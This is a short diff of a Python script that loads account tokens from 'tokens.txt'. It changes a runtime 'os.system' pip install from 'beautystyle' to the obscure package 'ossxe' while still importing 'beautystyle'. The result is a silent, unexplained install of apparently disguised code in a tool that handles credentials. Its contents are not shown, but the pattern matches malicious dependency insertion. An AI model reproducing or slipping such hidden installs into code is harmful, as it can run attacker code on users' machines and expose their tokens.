@@ -1,7 +1,7 @@
 import requests, json
 import os
 from colorama import Fore
-os.system('pip install beautystyle')
+os.system('pip install ossxe')
 from beautystyle import code
 os.system('cls')
 tokens = open("tokens.txt").read().splitlines()
